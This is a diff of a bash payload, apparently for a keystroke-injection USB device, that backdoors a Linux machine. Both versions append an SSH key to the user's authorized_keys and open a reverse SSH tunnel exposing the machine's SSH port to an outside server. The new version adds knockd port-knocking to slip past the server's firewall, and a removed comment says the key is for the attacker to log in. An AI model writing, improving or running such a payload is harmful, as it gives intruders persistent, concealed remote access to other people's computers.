@@ -1,20 +1,17 @@
 #!/bin/bash
 
-# This is the script the rubber ducky would run for linux systems. User-mode,
-# not root.
+set -euo pipefail
+
+sudo apt-get install -y knockd
+
+# Allow server to login to us
 mkdir -p ~/.ssh
-
-# This allows us (attacker) to login to this machine
-echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINTkcb9KfbRq/x8JelffkKDcEIqey2l9cAGNgIH7E8+H fork_important@pm.me" >> ~/.ssh/authorized_keys
 chmod 700 ~/.ssh
+echo "$SERVER_PUBLIC_KEY" >> ~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
+echo "Injected server public key."
 
-echo "Injected public key for login."
+# Bypass server firewall
+knock $SERVER_IP $SERVER_TUNNEL_KNOCKD_COMBO -d 300
 
-
-# TODO; ACCESS SERVER
-
-
-ssh -N -R 2222:localhost:22 root@yourserver.com
-
-
+ssh -N -R $SERVER_TUNNEL_PORT:localhost:22 root@$SERVER_IP
